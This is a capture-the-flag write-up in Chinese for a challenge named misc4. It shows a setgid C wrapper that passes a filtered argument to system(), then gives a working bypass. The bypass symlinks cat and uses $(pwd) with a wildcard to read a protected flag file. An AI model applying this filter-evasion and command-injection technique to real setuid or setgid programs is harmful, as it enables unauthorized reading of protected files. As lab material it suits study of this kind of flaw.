## misc4
### sol
連上ssh後可以發現三個file
```
misc4@quiz2:~$ ls -l
total 20
-r--r----- 1 root misc4x   32 Jun 24 16:01 flag
-r-xr-s--x 1 root misc4x 9160 Jun 24 17:02 shell
-r--r--r-- 1 root misc4x  686 Jun 24 17:02 shell.c
```
而shell有setgid，source code為：
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "\\")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	setregid(getegid(), -1);
	if(argc < 2) { return 0; }
	delete_env();
	putenv("PATH=/this_is_not_a_valid_path");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```
執行後會先把environment全部清除，接著設定一個invalid的PATH，而傳給shell的參數中不能包含`=`, `PATH`,`EXPORT`, `/`, `\\`, `flag`等字樣，推測是要利用shell去cat出flag的內容。
http://www.jianshu.com/p/c70e50710804 裡面末尾提供了一種方法，主要是利用pwd可以印出當前目錄，並且利用*來繞開flag名稱的限制，因此最後解法為
```shell
$ mkdir -p /tmp/test
$ cd /tmp/test
$ mkdir c
$ ln -s /bin/cat .
$ cd c
$ ln -s ~/flag .
$ ~/shell "\$(pwd)at f*"
```
